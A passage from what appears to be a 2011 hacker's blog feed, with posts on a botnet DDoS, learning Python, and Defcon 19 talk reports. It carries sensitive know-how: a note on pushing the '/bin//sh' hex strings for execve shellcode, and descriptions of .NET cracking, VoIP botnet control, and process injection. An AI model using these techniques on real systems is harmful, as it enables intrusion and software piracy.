  [&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/09/objdump.png" title="objdump" /&gt;]: http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/09/objdump.png&lt;/p&gt;</summary><category term="assembly"></category><category term="C"></category><category term="destruction"></category><category term="hacking"></category><category term="hex"></category><category term="linux"></category><category term="python"></category><category term="quantum physics"></category><category term="shellcode"></category><category term="stack randomization"></category><category term="syscall"></category></entry><entry><title>Robots Windsurfing Asteroids</title><link href="/robots-windsurfing-asteroids.html" rel="alternate"></link><updated>2011-09-02T17:24:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2011-09-02:robots-windsurfing-asteroids.html</id><summary type="html">&lt;p&gt;[&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/09/chineserobot.jpeg" title="Hey, China! Can you also turn the asteroid into a chocolate chip cookie? Because that would get you another +9000 punk points." /&gt;][]China is like &lt;em&gt;the&lt;/em&gt; punk house of the first world.&lt;/p&gt;
&lt;p&gt;Okay, China, your firewall is &lt;a href="http://boingboing.net/2006/06/29/net-censorship-howto.html"&gt;so draconian as to be absolutely
silly&lt;/a&gt;**, and it causes me extra work to send &lt;a href="https://www.torproject.org/docs/bridges"&gt;Tor bridge
addresses&lt;/a&gt; to your citizens. And your hackers, the ones you scoop up
by the dozen and put on government payrolls simply &lt;a href="http://www.bgr.com/2011/06/02/chinese-government-denies-hacking-google/"&gt;to cause havoc for
hackers and activists&lt;/a&gt; in your own and other countries...yeah. That's
a little annoying. And &lt;a href="https://www.projecthoneypot.org/ip_222.134.85.162"&gt;your&lt;/a&gt; &lt;a href="https://www.projecthoneypot.org/ip_61.164.87.130"&gt;cute&lt;/a&gt; &lt;a href="https://www.projecthoneypot.org/ip_221.234.24.46"&gt;little&lt;/a&gt; &lt;a href="https://www.projecthoneypot.org/ip_121.12.123.221"&gt;botmaster&lt;/a&gt; who
has been sending bad requests to my server for the past week or so. Eh,
whatevs.&lt;/p&gt;
&lt;p&gt;**The Great Chinese firewall uses a method very &lt;a href="http://www.patternsinthevoid.net/blog/2011/05/broadcast-de-auth-dos-attack-jamming-wifi-networks/" title="Broadcast De-auth DOS Attack: Jamming WiFi Networks"&gt;similar to this&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;But I just found out, China, that y'all are [planning to send a robot to
an asteroid to deflect it from a collision course][] with Earth in 2036.
And &lt;a href="http://arxiv.org/abs/1108.3183"&gt;how are you going to do that&lt;/a&gt;? Oh, okay. The robot &lt;em&gt;is going to
windsurf the asteroid&lt;/em&gt; away from Earth.&lt;/p&gt;
&lt;p&gt;I'm willing to forgive the above transgressions, because you just earned
+9000 punk points with that idea. You guys are not a country -- you're a
giant punk house.&lt;/p&gt;
&lt;p&gt;[&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/09/chineserobot.jpeg" title="Hey, China! Can you also turn the asteroid into a chocolate chip cookie? Because that would get you another +9000 punk points." /&gt;]: http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/09/chineserobot.jpeg
  [planning to send a robot to an asteroid to deflect it from a
  collision course]: http://www.popsci.com/technology/article/2011-08/solar-sailing-scheme-divert-asteroid-apophis-its-collision-course-earth?cmp=tw&lt;/p&gt;</summary><category term="apocalypse"></category><category term="asteroid"></category><category term="great chinese firewall"></category><category term="hacking"></category><category term="physics"></category><category term="robotics"></category><category term="Tor"></category></entry><entry><title>Botnets and DDoSing</title><link href="/botnets-and-ddosing.html" rel="alternate"></link><updated>2011-09-02T15:52:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2011-09-02:botnets-and-ddosing.html</id><summary type="html">&lt;p&gt;I was recently the Distributed Denial of Service (DDoS) target of a
known Chinese botnet. Why some random Chinese botmaster decided to
target me, I have no clue. Fortunately, the attack didn't really do any
damage because I use &lt;a href="https://www.cloudflare.com/"&gt;CloudFlare&lt;/a&gt;. Which is awesome (and free!). It
made it slightly more difficult for me to update my blog, and I ended
having to go into Wordpress though the frontend after tunneling to the
server over the &lt;a href="https://torproject.org/"&gt;Tor&lt;/a&gt; network. But, due to CloudFlare, my sight stayed
up throughout the entire attack, which lasted several days. Take that,
Chinese hackers!&lt;/p&gt;
&lt;p&gt;I mostly wanted to say that I just tested a new web server stress
analyzer, called &lt;a href="http://hailstorm.radicaldesigns.org/"&gt;Hailstorm&lt;/a&gt;, made by some of my friends over at
&lt;a href="http://radicaldesigns.org/"&gt;Radical Designs&lt;/a&gt;. It's basically a website (with a pretty UI!) that
you tell to go to your website, and it attempts to DDoS your website,
and then gives you a bunch of pretty graphs and charts on what happened.
I set the concurrent threads to their highest setting at 1000, and the
maximum requests to the highest setting at 5000. I gave Hailstorm the
highest bandwidth requests I could muster, like some of my music files
and artwork. My site didn't flinch. Not one bit. I even Hailstormed this
site several times within a period of a few minutes. Nothing.&lt;/p&gt;
&lt;p&gt;So, Hailstorm, you didn't really tell me anything. You should allow your
maximum requests and concurrent thread settings to go &lt;em&gt;way&lt;/em&gt; higher. I
guess if you did tell me anything, you told me that that Chinese botnet
was a giant scary monster of a botnet. Which told me, in turn, that
CloudFlare is an even more giant monster, albeit less scary. Thanks,
Hailstorm and CloudFlare, for teaching me things!&lt;/p&gt;
&lt;p&gt;And, fuck you, Chinese botmaster.&lt;/p&gt;</summary><category term="botnet"></category><category term="cloudflare"></category><category term="DDoS"></category><category term="hacking"></category><category term="hailstorm"></category><category term="radical designs"></category><category term="Tor"></category></entry><entry><title>It's Still Love</title><link href="/its-still-love.html" rel="alternate"></link><updated>2011-08-26T17:05:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2011-08-26:its-still-love.html</id><summary type="html">&lt;p&gt;Python is still amazing. I'm still in love with it.&lt;/p&gt;
&lt;p&gt;Here are the books I've been going through to teach myself Python, if
anyone else is interested, which you damn well should be. I was going
through &lt;em&gt;Learn Python The Hard Way&lt;/em&gt; at first, but that book is written
more for people who are new to programming, and if you're new to
programming then a high-level language like Python probably shouldn't be
your first. Er, maybe it should be, but (in my opinion) going with Lisp
first is better. But maybe I'm baised. I'm a theoretical physicist,
after all, and Lisp is pretty.&lt;/p&gt;
&lt;p&gt;Instead, and at the recommendation of my friend &lt;a href="http://kyleterry.com/"&gt;Kyle&lt;/a&gt;, I started
reading &lt;a href="http://diveintopython.org/"&gt;Dive Into Python&lt;/a&gt;, which is aimed at more experienced coders.&lt;/p&gt;
&lt;p&gt;And, if you're looking for practice, &lt;a href="http://www.pythonchallenge.com"&gt;Python Challenge&lt;/a&gt; has a series
of puzzles aimed at people interested in cryptography and Python. While
working on the puzzles, my desktop looked like this:&lt;/p&gt;
&lt;p&gt;[&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/08/snapshot1-1024x640.png" title="snapshot1" /&gt;][]&lt;/p&gt;
&lt;p&gt;Cipherpunk, like woah! And yes, I use emacs. I already said I was a
Lisper, don't hate.&lt;/p&gt;
&lt;p&gt;Python Challenge is like &lt;a href="http://www.hackthissite.org/pages/index/index.php"&gt;Hack This Site&lt;/a&gt; all over again! Fuck yeah!
So good!&lt;/p&gt;
&lt;p&gt;\&amp;lt;(A)3&lt;/p&gt;
&lt;p&gt;[&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/08/snapshot1-1024x640.png" title="snapshot1" /&gt;]: http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/08/snapshot1.png&lt;/p&gt;</summary><category term="python"></category></entry><entry><title>Shellcode, Hex Opcodes, and Dragons</title><link href="/shellcode-hex-opcodes-and-dragons.html" rel="alternate"></link><updated>2011-08-15T02:48:00Z</updated><author><name>isis agora lovecruft agora lovecruft</name></author><id>tag:,2011-08-15:shellcode-hex-opcodes-and-dragons.html</id><summary type="html">&lt;p&gt;I just realised why directory names in *nix systems are often three
characters. If you're loading pathnames into a syscall in assembly
language, you're given four byte strings to work with. For example, to
use the directory path of the shell “/bin/sh” as a variable within a
syscall function, such as execve(), so that the resulting call would be
execve(/bin/sh), you would need to push 0x68732f2f to the pre-cleared
register (0x68732f2f is hex for “//sh” and the leading “/” doesn't
matter). Then push 0x6e69622f (hex for “/bin”) onto the stack. Actually,
I'm not sure if this is why directories often have three character
names, but it makes sense to me.&lt;/p&gt;
&lt;p&gt;I mean, right? The old sysadmins from yesteryear planned all this to
deliberately make my task of writing shellcode easier? And dragons: they
do exist.&lt;/p&gt;</summary><category term="assembly languages"></category><category term="fairytaleland"></category><category term="hex"></category><category term="opcodes"></category><category term="shellcode"></category><category term="syscall"></category></entry><entry><title>Defcon Report Back, Part III</title><link href="/defcon-report-back-part-iii.html" rel="alternate"></link><updated>2011-08-10T18:45:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2011-08-10:defcon-report-back-part-iii.html</id><summary type="html">&lt;p&gt;Sunday 7th August, 2011, Defcon 19, Las Vegas&lt;/p&gt;
&lt;h2&gt;Whitfield Diffie &amp;amp; Moxie Marlinspike&lt;/h2&gt;
&lt;p&gt;It was nice to hear my friend Moxie talk with another admirable
cryptographer, Whitfield Diffie, &lt;em&gt;a la&lt;/em&gt; &lt;a href="https://www.rsa.com/rsalabs/node.asp?id=2248"&gt;Diffie-Hellman key exchange&lt;/a&gt;.
I hope, if Mr. Diffie should happen to read this, that he shall excuse
my link to RSA laboratories. However, it was regrettable to have so many
time burglars during the Q&amp;amp;A pretending to ask questions while actually
egotistically talking about obscure research they once did, or posing
artificial problems for &lt;a href="http://convergence.io"&gt;Moxie's Covergence project&lt;/a&gt; (a P2P
replacement for the current Certificate Authority structure, the former
of which bears similarities to the PGP/GPG web-of-trust structure).
Commenting on his project, at one point, Moxie said, "I believe that
Certificate Authorities and politicians are incredibly similar. That is,
I believe that trust in either should expire and and be replaced on a
second-to-second basis." Oh, Moxie. I think you just made every other
crypto-anarchist on the planet fall in love with you. \&amp;lt;(A)3&lt;/p&gt;
&lt;h2&gt;Cipherspaces &amp;amp; Darknets&lt;/h2&gt;
&lt;p&gt;&lt;a href="http://www.irongeek.com/"&gt;Adrian "Irongeek" Crenshaw&lt;/a&gt;'s talk, "Cipherspaces/Darknets: An
Overview of Attack Strategies", was incredibly basic. I was disappointed
to waste my hour listening to essentially the exact same talk I gave at
Evergreen State College in Olympia, Washington, on anonymity networks.
Snore. I did learn one new thing, namely that Firefox can be configured
to mitigate DNS leakage while using Tor by going into the about:config
and setting network.proxy.socks_remote_dns to true. But that's really
only useful if you're using &lt;em&gt;only&lt;/em&gt; Tor for anonymity -- if you use a
well-configured VPN before connecting to Tor your DNS should already be
geolocationally randomized.&lt;/p&gt;
&lt;h2&gt;Cryptographic Oracles&lt;/h2&gt;
&lt;p&gt;&lt;a href="http://twitter.com/dan_crowley"&gt;Daniel Crowley&lt;/a&gt; gave a talking &lt;a href="https://good.net/dl/k4r3lj/DEFCON19/DEFCON-19-Crowley-Cryptographic-Oracles.pdf"&gt;on defeating various cryptographic
schemes using oracles&lt;/a&gt;. Crowley, who is adorable and has an excellent
surname, gave a brief overview of cryptographic terms and ideas, and
then delved into encryption and decryption oracles. An oracle is
essentially any data which is leaked from a cryptographic scheme. So,
for example, if I send multiple queries to a database which uses
encryption, I can get a good idea of how that encryption is occurring
based on the server's responses to manipulated queries such as "aaaa"
"aaaabbbbaaaabbbb" "ababab" etc. At one point during Crowley's demo,
which sadly didn't work as expected, Crowley was using the encrypted
data from a cookie to make SQL injections on a website's encrypted
database. The attack was supposed to result in a page which read "I have
a crush on Moxie Marlinspike...shh!" but, again, it didn't work during
the live demo. As I said earlier, Moxie, every crypto-anarchist and
cipherpunk on the planet is in love with you.&lt;/p&gt;
&lt;p&gt;The next talk was on the use of PLCs in the prison system. I'm going to
devote an entire post to discussing this, later, when I'm already in a
bad mood, because that talk made me sick to my stomach with some of the
things I realized. And the presenters' compliance with government
agencies and sociopathic lust to put other human's in cages was
absolutely disgusting. Fuck them.&lt;/p&gt;</summary><category term="anonymity"></category><category term="certificate authority"></category><category term="cipherspace"></category><category term="convergence"></category><category term="crypto-anarchism"></category><category term="cryptography"></category><category term="darknet"></category><category term="Defcon"></category><category term="defeating cryptography"></category><category term="dns leakage"></category><category term="irongeek"></category><category term="Moxie Marlinspike"></category><category term="sql injection"></category><category term="vpn"></category><category term="Whitfield Diffie"></category></entry><entry><title>Defcon Report Back, Part II</title><link href="/defcon-report-back-part-ii.html" rel="alternate"></link><updated>2011-08-09T02:47:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2011-08-09:defcon-report-back-part-ii.html</id><summary type="html">&lt;p&gt;Saturday 6^th^ August 2011, Defcon 19, Las Vegas&lt;/p&gt;
&lt;h2&gt;Smartfuzzing&lt;/h2&gt;
&lt;p&gt;I missed &lt;a href="https://raft.googlecode.com/files/Smartfuzzing_The_Web_BlackHatUSA_2011.pdf"&gt;Smartfuzzing the Web: Carpe Vestra Foramina&lt;/a&gt;, by Nathan
Hamiel et. al., which I had wanted to attend. I went through the pdf of
the presentation just now, and I wouldn't exactly call it smartfuzzing,
but I did note the cleverness of the presenters' idea to use wordlists
comprised of words taken from the robots.txt file of websites for
fuzzying purposes. Their new tool, &lt;a href="https://code.google.com/p/raft/"&gt;RAFT&lt;/a&gt;, is being released soon,
though it is currently available as an svn checkout.&lt;/p&gt;
&lt;h2&gt;Creating Cracks and Keygens for .NET Applications&lt;/h2&gt;
&lt;p&gt;The first presentation I attended was &lt;a href="http://good.net/dl/k4r3lj/DEFCON19/DEFCON-19-McCoy-Hacking-Net.pdf"&gt;Hacking .Net Applications&lt;/a&gt; by
&lt;a href="http://digitalbodyguard.com/"&gt;Jon McCoy&lt;/a&gt;. He detailed the extensive uses of his GreyWolf and
GreyDragon tools, including the production of cracks, keygens, and
malware. &lt;a href="http://digitalbodyguard.com/Programs.html"&gt;GreyWolf&lt;/a&gt;, which is currently in Beta, is a reverse
engineering tool which allows extraction of source code from .dll files,
and &lt;a href="http://digitalbodyguard.com/Programs.html"&gt;GreyDragon&lt;/a&gt; is a .NET injection tool. It was astounding
how little actual security is put into authentication of enterprise
applications. The funniest use of GreyDragon was an instance in the demo
in which McCoy altered a Boolean string controlling a password check
from var a=true to var a!=true, which meant that only wrong passwords
would allow access to the program. He was also able to extract source
code from .dlls, find the security and authentication mechanisms, and
then create a keygen for the demonstrated program – a commercial
keylogger – within five minutes.&lt;/p&gt;
&lt;h2&gt;VoIP Botnetting&lt;/h2&gt;
&lt;p&gt;The presentation which might possibly rank as the most impressive was
&lt;a href="http://good.net/dl/k4r3lj/DEFCON19/DEFCON-19-Kotler-Amit-Sounds-Like-Botnet.pdf"&gt;Sounds Like Botnet&lt;/a&gt; by &lt;a href="http://security-art.com/"&gt;Itzik Kotler and Iftach Ian Amit&lt;/a&gt;, on VoIP
botnetting. The idea is that certain networks which do not allow active
connections to the outside internet usually do allow VoIP traffic, and
these packets are not often paid much attention. Basically, SIP (Session
Initiation Protocol) is quite similar to HTTP and has little security
built in. SIP supports TSL, but even with this type of encryption
enabled the traffic can be easily sniffer. What this means is that SIP
traffic can easily transverse firewalls, and SIP-to-PSTN (Public Service
Telephony Network, a.k.a. standard telephone lines) can be used to relay
commands to botnetted machine within a closed network, or a network
which does not allow internet access.&lt;/p&gt;
&lt;p&gt;Researchers Kotler and Amit used an &lt;a href="https://www.asterisk.org/"&gt;Asterisk&lt;/a&gt; server hosted in the
cloud as the Command-and-Control (C&amp;amp;C). Conference calls were used to
link botnetted boxes together and issue commands from the botmaster,
which also allows for more anonymous direction of the botnet with
conference call bridge numbers. &lt;a href="https://code.google.com/p/moshimoshi/"&gt;Moshi Moshi&lt;/a&gt;, an open source VoIP
botnet, was used to communicate with the botnet using Text-to-Speech
engines for output to the botmaster and DTMF tones for input. DTMF
stands for Dual-Tone Multi-Frequency signalling, and, if you remember
the adventures of phreaker Captain Crunch and his 2600Hz whistle tones
which allowed for free telephone calls, you've basically got the idea.
With DTMF, standard keyboard inputs are mapped to certain tonal
frequencies, and when a machine with such translation software
installed, complete binary files and commands can be sent over the wire
through music. Seriously. You make techno music out of a binary file,
play it to your zombies, and they execute the binary. Fucking awesome.
So, the botmaster calls into the conference call on the server, and
receives Text-to-Speech information on the number of machines connected.
During the demo, when the presenters called into the Asterisk server,
they were greeted with a robotic voice saying, "There are currently two
others in this conference room." Next, they played a .wav file of DTMF
tones, and the machines went off to do their bidding.&lt;/p&gt;
&lt;p&gt;I really, really, really want Botnet to become a new EBM subgenre.
Really badly.&lt;/p&gt;</summary><category term="asterisk"></category><category term="botnet"></category><category term="Defcon"></category><category term="dual-tone multi-frequency"></category><category term="GreyDragon"></category><category term="GreyWolf"></category><category term="keygen"></category><category term="linux"></category><category term="moshi moshi"></category><category term="password cracking"></category><category term="RAFT"></category><category term="reverse engineering"></category><category term="sip-to-pstn"></category><category term="smart fuzzing"></category><category term="voip botnet"></category><category term="web fuzzing"></category></entry><entry><title>Defcon Report Back, Part 1</title><link href="/defcon-report-back-part-1.html" rel="alternate"></link><updated>2011-08-08T23:59:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2011-08-08:defcon-report-back-part-1.html</id><summary type="html">&lt;p&gt;Friday 5^th^ August 2011, Defcon 19, Las Vegas&lt;/p&gt;
&lt;h2&gt;Analyzing Embedded Malicious Code in PDFs&lt;/h2&gt;
&lt;p&gt;So, the first was Mahmud Ab Rahman's presentation &lt;a href="www.giac.org/paper/gpen/3418/malicious-pdf-analysis/121349"&gt;on parsing and
analyzing malacious code embedded in .pdfs&lt;/a&gt;. I can't guarantee that
paper doesn't have anything malicious embedded. But I have used a .pdf
parser written in python by &lt;a href="https://DidierStevens.com"&gt;Didier Stevens&lt;/a&gt; and been very confused
about .pdf code structure, so Ab Rahman's Sneaky PDF lecture was highly
enlightening. I can't find video for that presentation up yet, but that
.pdf above does contain everything said and the original slides.
Basically, malicious .pdfs use JavaScript code obfuscation through
spaghetti code, infinite loops, misdirected object references, code
encryption, and media-rich embedded objects such as flash videos or
audio files. Ab Rahman gave a few lists of tools which he used to better
parse and de-obfuscate: tools such as &lt;a href="https://developer.mozilla.org/en/SpiderMonkey"&gt;SpiderMonkey&lt;/a&gt;, &lt;a href="https://www.mozilla.org/rhino/"&gt;Rhino&lt;/a&gt;,
&lt;a href="https://code.google.com/p/v8/"&gt;V8&lt;/a&gt;, and &lt;a href="http://jsbeautifier.org/"&gt;JSBeautifier&lt;/a&gt; can all be used to fix spaghetti code,
infinite loops, and misdirected object references, and tools like
&lt;a href="www.unixuser.org/~euske/python/pdfminer/"&gt;PDFminer&lt;/a&gt;, &lt;a href="https://gallus.honeynet.org.my/"&gt;Gallus&lt;/a&gt;, &lt;a href="http://news.wepawet.cs.ucsb.edu/"&gt;Wepawet&lt;/a&gt;, &lt;a href="http://aptdeezer.xecure-lab.com/"&gt;APTdeezer&lt;/a&gt;, and &lt;a href="http://esec-lab.sogeti.com/pages/Origami"&gt;Origami&lt;/a&gt;
can be used in addition to Didier Steven's above referenced tool for
parsing. Also, I found &lt;a href="http://www.decalage.info/file_formats_security/pdf"&gt;an entire site on PDF security issues&lt;/a&gt;, with
lists of relevant tools and white papers which go into more detail on
obfuscation and detection methods.&lt;/p&gt;
&lt;h2&gt;Linux Thread Injection&lt;/h2&gt;
&lt;p&gt;Aseem “@” Jakhar presented on &lt;a href="http://null.co.in/section/atheneum/projects/"&gt;Jugaad&lt;/a&gt;, a newly released Linux Thread
Injection kit, which uses the &lt;a href="https://secure.wikimedia.org/wikipedia/en/wiki/Ptrace"&gt;ptrace() function&lt;/a&gt; in &lt;a href="https://secure.wikimedia.org/wikipedia/en/wiki/Gdb"&gt;gdb&lt;/a&gt; to inject
arbitrary code into running processes. &lt;a href="http://good.net/dl/k4r3lj/DEFCON19/DEFCON-19-Jakhar-Jugaad-Linux-Thread-Injection.pdf"&gt;Here's the pdf&lt;/a&gt; of his
presentation, and &lt;a href="http://www.slideshare.net/null0x00/project-jugaad"&gt;here's the slides&lt;/a&gt; from slideshare. The&lt;a href="http://www.devshed.com/c/a/BrainDump/The-MMAP-System-Call-in-Linux/"&gt;mmap
syscall&lt;/a&gt; was used to produce shellcode in hex from assembly for
payload creation. (If this sounds like jibberish, you might want to
learn about &lt;a href="https://secure.wikimedia.org/wikipedia/en/wiki/Shellcode"&gt;what shellcode is&lt;/a&gt; and &lt;a href="http://www.vividmachines.com/shellcode/shellcode.html"&gt;how to write shellcode&lt;/a&gt;, which
is going to include &lt;a href="http://homepage.mac.com/randyhyde/webster.cs.ucr.edu/index.html"&gt;learning assembly languages&lt;/a&gt;.) It's essentially
the Linux equivalent of the Windows malware &lt;a href="http://www.codeproject.com/KB/threads/completeinject.aspx"&gt;CreateRemoteThread()
API&lt;/a&gt;, and Jugaad provides all the functionality and ease-of-use as its
Windows cousin. All the more reason to &lt;a href="http://freshmeat.net/projects/sptrace"&gt;disable ptrace()
functionality&lt;/a&gt; on boxes which are not being actively used in
production environments, or use sptrace() to limit user access to that
functionality.&lt;/p&gt;
&lt;h2&gt;Runtime Process Library Injection&lt;/h2&gt;
&lt;p&gt;Along a similar line,&lt;a href="http://0xfeedface.org/users/lattera"&gt;Shawn Webb&lt;/a&gt; talked about&lt;a href="http://good.net/dl/k4r3lj/DEFCON19/DEFCON-19-Webb-Runtime-Process-Insemination.pdf"&gt;runtime process
insemination&lt;/a&gt; (click for pdf) using his also newly released tool,
&lt;a href="http://0xfeedface.org/category/tags/libhijack"&gt;Libhijack&lt;/a&gt;, to anonymously inject shared objects and libraries in as
little as eight lines of C code, with little to no physical evidence
left behind.&lt;/p&gt;
&lt;h2&gt;UPnP Mapping&lt;/h2&gt;
&lt;p&gt;There was a &lt;a href="http://good.net/dl/k4r3lj/DEFCON19/DEFCON-19-Garcia-UPnP-Mapping.pdf"&gt;presentation on Universal Plug-and-Play (UPnP) device
mapping&lt;/a&gt; by Daniel Garcia. Most of what I took from that was that
Garcia's Umap scanner allows mapping of hosts behind the device NAT,
SOCKv4 proxying, and manual port-mapping from LAN to WAN and vice versa.
This allows masking of IP addresses and attacking non-outward facing
hosts within an internal network. Garcia released a new tool, &lt;a href="http://packetstormsecurity.org/files/90598/Umap-UPNP-Map-0.1beta.html"&gt;Umap&lt;/a&gt;,
which scans TCP for open ports behind UPnP enabled Internet Gateway
Devices.&lt;/p&gt;
&lt;h2&gt;Kernel Exploitation&lt;/h2&gt;
&lt;p&gt;Next up was Kees Cook, head of security at Ubuntu, presenting&lt;a href="https://good.net/dl/k4r3lj/DEFCON19/DEFCON-19-Cook-Kernel-Exploitation.pdf"&gt;on Kernel
Exploitation&lt;/a&gt;. I'll admit this talk was a little above my head, and
I'm looking forward to going over notes on it and following the commands
in the slides more closely. It seemed like it was basically the same
thing as the ptrace() vulnerability, and there was something about grep
copy_from_user() without access_ok().&lt;/p&gt;
&lt;p&gt;Update for the talks from Saturday and Sunday to follow!&lt;/p&gt;</summary><category term="assembly languages"></category><category term="Defcon"></category><category term="javascript"></category><category term="jugaad"></category><category term="Kernel Exploitation"></category><category term="las vegas"></category><category term="libhijack"></category><category term="linux thread injection"></category><category term="malicious pdf"></category><category term="mmap syscall"></category><category term="port scan"></category><category term="ptrace"></category><category term="python"></category><category term="runtime process library injection"></category><category term="shellcode"></category><category term="sptrace"></category><category term="strace"></category><category term="Umap"></category><category term="UPnP"></category></entry><entry><title>Defcon Report Back, Intro</title><link href="/defcon-report-back-intro.html" rel="alternate"></link><updated>2011-08-08T15:28:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2011-08-08:defcon-report-back-intro.html</id><summary type="html">&lt;p&gt;I'm sitting in McCarren Internation Airport in &lt;a href="http://www.uwec.edu/geography/ivogeler/w188/lasvegas/v18.htm"&gt;Las Vegas, Nevada&lt;/a&gt;,
killing the next two hours over a slow 3G connection. This was my first
time going to &lt;a href="https://www.defcon.org/html/defcon-19/dc-19-index.html"&gt;Defcon&lt;/a&gt;. I remember watching videos of Defcon talks on
my home-built computer when I was nine or so. In fifth grade, I had a
crush on &lt;a href="http://web.mit.edu/newsoffice/2002/crops-1009.html"&gt;Zoz&lt;/a&gt;. I don't remember why I thought they were the shit –
maybe it was the
skinny-nerdy-queerish-blond-mohawk-hacker-person-who-makes-fake-crop-circles-for-their-Ph.D.-thesis
thing. I really wanted to go to MIT at that age, and Zoz was my hero.
Hey, don't make fun of me. I was nine, okay?&lt;/p&gt;
&lt;p&gt;Hop in your &lt;a href="http://hacks.mit.edu/by_year/2010/tardis/"&gt;blue telephone box&lt;/a&gt; and skip forward a decade or so, and
I'm at my first Defcon. It was also my first time staying in Las Vegas.
Fuck this town. It's everything that went wrong with capitalism
amplified and tarballed into a single sexism-infected package, wrapped
in a sick slime of wealth, extreme classism, greed, extra sexism (for
good measure), and a heaping sporkful of objectification of
female-bodied folk on the side. Fuck. You. Las. Vegas.&lt;/p&gt;
&lt;p&gt;And fuck everyone who assumes that I'm a girl because I currently live
in a female-body. Fuck all the time burglars who think it's okay to talk
to me without asking if I feel social. Fuck the bro-”hacker”s who think
it's okay to buy me drinks – and then try to talk to me! – as if I
desired either one. Fuck the goon who asked if my face tattoo was real,
and then licked his finger and wiped my face...after I had declined his
marriage proposition. Fuck the socially inept geek boys who think
hugging/touching me without consent is okay, just because I can geek out
on neural networks, exploit-dev, 0-days, and cryptography. Don't any of
you turd-gurglers realize that I have anxiety issues on top of
neurological problems, and the former is caused by sexual and physical
abuse at the hands of males? I don't know, maybe something about my body
language, the fact that I clench my fists and stand five feet away from
whoever I'm talking to? Might be a hint, I don't know. And fuck the
people who indiscriminately referred to me as she, even after syntax
correction. Fuck that fed that thought it was okay to ask me a bunch of
sketchy questions, then not pick up on my disinclination towards
communication, then ask me if I wanted to come to his hotel room and
take E and huff nitrous. Sorry, dude. &lt;a href="http://www.deathandtaxesmag.com/127506/an-open-letter-to-defcon-hackers-dont-sell-out-to-the-nsa/"&gt;I don't fucking talk to feds.&lt;/a&gt;
I don't talk to &lt;a href="http://www.wired.com/threatlevel/2009/06/hacker-dark-tangent-joins-dhs-security-council/"&gt;people who work for the Department of Homeland
Security&lt;/a&gt;. I don't give out any information to military, or &lt;a href="http://www.thehackernews.com/2011/08/pentagon-launches-cyber-fast-track.html"&gt;military
contractors&lt;/a&gt;. I don't talk to &lt;a href="https://encrypted.google.com/search?q=cops+kill&amp;amp;ie=utf-8&amp;amp;oe=utf-8&amp;amp;aq=t&amp;amp;rls=org.mozilla:en-US:official&amp;amp;client=firefox-a#q=cops+kill&amp;amp;hl=en&amp;amp;client=firefox-a&amp;amp;hs=UXe&amp;amp;rls=org.mozilla:en-US:official&amp;amp;prmd=ivnsu&amp;amp;source=univ&amp;amp;tbm=nws&amp;amp;tbo=u&amp;amp;sa=X&amp;amp;ei=LLJATqy-OeXZiALW5cDHBQ&amp;amp;ved=0CCcQqAI&amp;amp;bav=on.2,or.r_gc.r_pw.&amp;amp;fp=31db879d6906bc09&amp;amp;biw=1280&amp;amp;bih=607"&gt;cops&lt;/a&gt;. I piss on &lt;a href="http://www.youtube.com/watch?v=7zQ8lcgxeZk"&gt;cop
sympathizers&lt;/a&gt;. Fuck the &lt;a href="http://strauchs-llc.com/about.shtml"&gt;sociopathic prison industry contractors&lt;/a&gt;.
Fuck you all. Not my team. Not my fucking team.&lt;/p&gt;
&lt;p&gt;/rant&lt;/p&gt;
&lt;p&gt;So, the talks at defcon were highly informative, and it was incredibly
refreshing to temporarily be part of a community where a laptop and a
pile of tangled cords draped over your legs, a text-only screen with a
terminal multiplexer and code editor open, a tethered cell phone, and
output flying by on active port scans is completely expected and normal.
No one thought it was crazy to carry multiple hard drives and wireless
cards instead of business cards and lipstick. NOP-sled and buffer
overflow jokes abounded. (My friend, Flatline, kept belting out with "Oh
girl! You rode a NOP-sled into my heart! Your buffer overflows rewrite
my emotional code! Then you injected a string, and now you're in for
good!" in the conference space hallways.) No one thought twice about
lockpicks in my dreads, or the 32GB USB key earring in my ear. No one
gave me puzzled looks if they saw me remove my credit cards or passport
from their aluminum foil homemade-Faraday-cage enclosure...well, with
the exception of that vendor selling RFID disabling wallets after I told
all of their potential customers about the unbelievable magic of tin
foil. Oopsies, sorry man. It's what you get for ripping people off.&lt;/p&gt;
&lt;p&gt;And I just want to say, before I get on to talking about the
presentations, that my tech-positive and hacker anarchist friends are
awesome. You are all cuter than robots, and I'm sorry if sometimes I
call you broken robots for not answering my obscure and complicated
queries on the fly. I also got a chance to hang out with my friend
&lt;a href="http://thoughtcrime.org/"&gt;Moxie Marlinspike&lt;/a&gt;, a wonderful hacker and cryptographer who also has
radical politics. (Check out his&lt;a href="http://convergence.io/details.html"&gt;new project to replace the Certificate
Authority&lt;/a&gt; verification system.) We went to some schmoozy fancy-pants
restaurant and couldn't really eat much because we both have Celiac's
Disease. Then we went to some douchey &lt;a href="https://www.blackhat.com/html/bh-us-11/bh-us-11-home.html"&gt;Black Hat Con&lt;/a&gt; VIP invite-only
party on a rooftop, where there were white hats failing at being cool,
smoking cigars and drinking cocktails. Well, I probably don't need to
say that the white hats fail at being cool, because they're the
definition of fail. Basically, for those who haven't gathered this much
yet, Black Hat Con is exactly the same as Defcon. Same presentations,
same speakers, mostly the same workshops. The only difference is that
Black Hat Con costs \$2000 and is marketed as a "security conference",
whereas Defcon costs \$150 cash, up front, and is called a "hacker
conference". So, the corporate drones pay for their white hat schmoes to
go to the "security conference". Black Hat Con paid for Moxie's room,
which inclued a “jacuzzi” in the bathroom, which ended up being a
half-hour discussion with occasional googling and wikipeding to backup
claims on the correct definition of a jacuzzi. And, Moxie: it might be
